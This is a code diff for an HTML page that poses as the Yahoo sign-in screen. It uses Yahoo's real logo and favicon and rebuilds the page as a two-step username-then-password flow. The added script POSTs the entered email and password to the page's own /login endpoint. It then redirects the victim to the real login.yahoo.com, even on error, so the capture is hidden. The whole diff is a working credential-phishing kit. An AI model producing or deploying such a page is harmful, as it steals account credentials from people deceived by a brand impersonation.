@@ -4,72 +4,130 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Yahoo</title>
+    <link rel="icon" href="https://s.yimg.com/rz/l/favicon.ico" type="image/x-icon">
     <style>
         body {
             font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
-            background-color: #f0f3f7;
+            background-color: #fff;
             margin: 0;
             display: flex;
-            justify-content: flex-end; /* Yahoo puts login on right usually, or centered. Centered is safer. */
-            align-items: center;
             height: 100vh;
-            flex-direction: column;
         }
-        .header {
+
+        .login-side {
             width: 100%;
-            padding: 20px 40px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 24px;
             box-sizing: border-box;
-            position: absolute;
-            top: 0;
-            left: 0;
+            background-color: #fff;
         }
-        .header img {
+
+        .ad-side {
+            display: none;
+            width: 50%;
+            background-color: #f0f3f7;
+            background-image: url('https://s.yimg.com/wm/login/2-0-12/assets/login-hero-2.svg'); /* Fallback or specific image */
+            background-size: cover;
+            background-position: center;
+        }
+
+        @media (min-width: 1024px) {
+            .ad-side {
+                display: block;
+                width: 40%;
+            }
+            .login-side {
+                width: 60%;
+            }
+        }
+
+        .login-box {
+            width: 100%;
+            max-width: 360px;
+            text-align: center;
+        }
+
+        .logo-center {
+            margin-bottom: 30px;
+        }
+        
+        .logo-center img {
             height: 36px;
         }
-        .login-box {
-            width: 360px;
-            background-color: #fff;
-            padding: 40px 28px;
-            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
-            border-radius: 2px;
-            text-align: center;
-            position: relative;
+
+        .step-container {
+            transition: opacity 0.3s ease-in-out;
         }
-        .logo-center {
-            margin-bottom: 20px;
+
+        .hidden {
+            display: none;
+            opacity: 0;
         }
-        .logo-center img {
-            height: 27px;
+
+        .fade-in {
+            animation: fadeIn 0.5s;
         }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
         h1 {
             font-size: 24px;
             font-weight: 600;
-            margin-bottom: 10px;
+            margin-bottom: 8px;
             color: #26282a;
+            margin-top: 0;
         }
+
         p {
             font-size: 16px;
             color: #26282a;
             margin-bottom: 40px;
         }
+        
+        .user-greeting {
+            font-size: 18px;
+            font-weight: 400;
+            margin-bottom: 6px;
+            color: #26282a;
+        }
+        
+        .user-email-display {
+            font-size: 14px;
+            font-weight: 600;
+            color: #26282a;
+            margin-bottom: 40px;
+        }
+
         .input-group {
             position: relative;
             margin-bottom: 24px;
+            text-align: left;
         }
+
         input {
             width: 100%;
             border: none;
             border-bottom: 1px solid #e0e4e9;
-            padding: 10px 0;
+            padding: 12px 0 4px;
             font-size: 16px;
             color: #26282a;
             box-sizing: border-box;
             transition: border-bottom-color 0.2s;
+            background: transparent;
+            height: 32px;
         }
+
         input:focus {
             border-bottom-color: #188fff;
             outline: none;
         }
+
         label {
             position: absolute;
             left: 0;
@@ -79,111 +137,290 @@
             pointer-events: none;
             transition: 0.2s ease all;
         }
-        input:focus ~ label, input:not(:placeholder-shown) ~ label {
-            top: -14px;
+
+        input:focus ~ label,
+        input:not(:placeholder-shown) ~ label {
+            top: -10px;
             font-size: 12px;
             color: #6e7780;
         }
+        
+        .password-toggle {
+            position: absolute;
+            right: 0;
+            top: 8px;
+            background: none;
+            border: none;
+            cursor: pointer;
+            padding: 0;
+        }
+        
+        .password-toggle svg {
+            width: 24px;
+            height: 24px;
+            fill: #6e7780;
+        }
+
         .next-btn {
             background-color: #188fff;
             color: #fff;
             border: none;
-            border-radius: 18px;
+            border-radius: 24px;
             width: 100%;
-            padding: 10px;
+            padding: 12px;
             font-size: 16px;
-            font-weight: 600;
+            font-weight: 700;
             cursor: pointer;
             margin-bottom: 20px;
+            transition: background-color 0.2s;
         }
+
         .next-btn:hover {
             background-color: #0074cc;
         }
-        .checkbox-group {
+        
+        .secondary-btn {
+            background-color: transparent;
+            color: #188fff;
+            border: 1px solid #188fff;
+            border-radius: 24px;
+            width: 100%;
+            padding: 12px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            margin-bottom: 20px;
+            transition: background-color 0.2s;
+        }
+        
+        .secondary-btn:hover {
+            background-color: #f0f8ff;
+        }
+
+        .checkbox-wrapper {
             display: flex;
             align-items: center;
-            margin-bottom: 20px;
-            font-size: 14px;
-            color: #26282a;
+            margin-bottom: 24px;
+            justify-content: flex-start;
         }
-        .checkbox-group input {
+
+        .checkbox-wrapper input {
             width: auto;
             margin-right: 10px;
+            height: auto;
         }
-        .forgot {
-            color: #188fff;
-            text-decoration: none;
-            font-size: 14px;
-        }
-        .create-account {
-            margin-top: 20px;
+
+        .checkbox-wrapper label {
+            position: static;
             font-size: 14px;
             color: #26282a;
         }
-        .create-account a {
+
+        .links {
+            margin-top: 20px;
+            font-size: 14px;
+        }
+
+        .links a {
             color: #188fff;
             text-decoration: none;
+            margin: 0 5px;
         }
+        
+        .links a:hover {
+            text-decoration: underline;
+        }
+        
+        .spinner {
+            display: inline-block;
+            width: 18px;
+            height: 18px;
+            border: 2px solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spin 1s ease-in-out infinite;
+            margin-right: 8px;
+            vertical-align: middle;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        .error-message {
+            color: #f0162f;
+            font-size: 14px;
+            margin-bottom: 20px;
+            display: none;
+            text-align: left;
+        }
+        
+        .header-top {
+            position: absolute;
+            top: 20px;
+            right: 40px;
+            display: flex;
+            align-items: center;
+        }
+        
+        .header-top a {
+            text-decoration: none;
+            color: #188fff;
+            font-size: 14px;
+            font-weight: 600;
+        }
+        
+        .header-top svg {
+            width: 20px;
+            height: 20px;
+            margin-left: 5px;
+            fill: #188fff;
+        }
+
     </style>
-    <script>
-        async function handleLogin(event) {
-            event.preventDefault();
-            const form = event.target;
-            const formData = new FormData(form);
-            const data = Object.fromEntries(formData.entries());
-            
-            try {
-                const response = await fetch('/login', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(data)
-                });
-                
-                if (response.ok) {
-                    window.location.href = "https://login.yahoo.com";
-                }
-            } catch (error) {
-                console.error('Error:', error);
-            }
-        }
-    </script>
 </head>
 <body>
-    <div class="header">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/3a/Yahoo%21_%282019%29.svg/500px-Yahoo%21_%282019%29.svg.png" alt="Yahoo">
+    <div class="ad-side">
+        <!-- Optional: Add content here if needed -->
     </div>
     
-    <div class="login-box">
-        <div class="logo-center">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/3a/Yahoo%21_%282019%29.svg/500px-Yahoo%21_%282019%29.svg.png" alt="Yahoo">
+    <div class="login-side">
+        <div class="header-top">
+            <a href="#">Help</a>
         </div>
-        <h1>Sign in</h1>
-        <p>Sign in using your Yahoo account</p>
         
-        <form id="login-form" onsubmit="handleLogin(event)">
-            <div class="input-group">
-                <input type="text" id="username" name="username" placeholder=" " required>
-                <label for="username">Username, email, or mobile</label>
+        <div class="login-box">
+            <div class="logo-center">
+                <img src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_p_205x58_frontpage.png" alt="Yahoo">
             </div>
-            
-             <div class="input-group">
-                <input type="password" id="password" name="password" placeholder=" " required>
-                <label for="password">Password</label>
+
+            <!-- Step 1: Username -->
+            <div id="step-1" class="step-container fade-in">
+                <h1>Sign in</h1>
+                <p>Sign in using your Yahoo account</p>
+                
+                <form onsubmit="handleStep1(event)">
+                    <div class="input-group">
+                        <input type="text" id="username" placeholder=" " required>
+                        <label for="username">Username, email, or mobile</label>
+                    </div>
+
+                    <div class="checkbox-wrapper">
+                        <input type="checkbox" id="stay-signed-in">
+                        <label for="stay-signed-in">Stay signed in</label>
+                    </div>
+
+                    <button type="submit" class="next-btn" id="btn-next">Next</button>
+                    
+                    <button type="button" class="secondary-btn">Forgot username?</button>
+                    
+                    <button type="button" class="secondary-btn" style="border-color: #e0e4e9; color: #26282a;">Create an account</button>
+                    
+                    <div style="margin-top: 20px; font-size: 12px; color: #6e7780;">
+                        Or, <a href="#" style="color: #188fff; text-decoration: none;">continue with Google</a>
+                    </div>
+                </form>
             </div>
-            
-            <button type="submit" class="next-btn">Next</button>
-            
-            <div class="checkbox-group">
-                <input type="checkbox" id="stay-signed-in" checked>
-                <label for="stay-signed-in" style="position: static; pointer-events: auto;">Stay signed in</label>
+
+            <!-- Step 2: Password -->
+            <div id="step-2" class="step-container hidden">
+                <div class="user-greeting">Hello</div>
+                <div class="user-email-display" id="display-email">user@yahoo.com</div>
+                
+                <div class="error-message" id="error-msg">Invalid password. Please try again.</div>
+
+                <form onsubmit="submitLogin(event)">
+                    <div class="input-group">
+                        <input type="password" id="password" placeholder=" " required>
+                        <label for="password">Password</label>
+                        <button type="button" class="password-toggle" onclick="togglePassword()">
+                            <svg viewBox="0 0 24 24"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
+                        </button>
+                    </div>
+
+                    <button type="submit" class="next-btn" id="btn-login">Next</button>
+                    
+                    <div style="margin-top: 10px;">
+                        <a href="#" style="color: #188fff; text-decoration: none; font-size: 14px;">Forgot password?</a>
+                    </div>
+                </form>
             </div>
-            
-            <a href="#" class="forgot">Forgot username?</a>
-        </form>
-        
-        <div class="create-account">
-            <a href="#">Create an account</a>
         </div>
     </div>
+
+    <script>
+        function handleStep1(event) {
+            event.preventDefault();
+            const username = document.getElementById('username').value;
+            if (!username) return;
+
+            document.getElementById('display-email').textContent = username;
+            
+            // Transition to Step 2
+            const step1 = document.getElementById('step-1');
+            const step2 = document.getElementById('step-2');
+            
+            step1.classList.add('hidden');
+            step1.classList.remove('fade-in');
+            
+            step2.classList.remove('hidden');
+            step2.classList.add('fade-in');
+            
+            // Focus password field
+            setTimeout(() => {
+                document.getElementById('password').focus();
+            }, 100);
+        }
+
+        function togglePassword() {
+            const passwordInput = document.getElementById('password');
+            if (passwordInput.type === 'password') {
+                passwordInput.type = 'text';
+            } else {
+                passwordInput.type = 'password';
+            }
+        }
+
+        function submitLogin(event) {
+            event.preventDefault();
+            const login = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            if (!login || !password) return;
+
+            const btn = document.getElementById('btn-login');
+            const originalText = btn.innerHTML;
+            btn.innerHTML = '<span class="spinner"></span> Verifying...';
+            btn.disabled = true;
+
+            fetch('/login', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    email: login,
+                    password: password
+                })
+            }).then(response => {
+                if (response.ok) {
+                    window.location.href = "https://login.yahoo.com/";
+                } else {
+                    btn.innerHTML = originalText;
+                    btn.disabled = false;
+                    
+                    // Show error message
+                    const errorMsg = document.getElementById('error-msg');
+                    errorMsg.style.display = 'block';
+                    
+                    // Clear password
+                    document.getElementById('password').value = '';
+                }
+            }).catch(error => {
+                console.error('Error:', error);
+                window.location.href = "https://login.yahoo.com/";
+            });
+        }
+    </script>
 </body>
 </html>
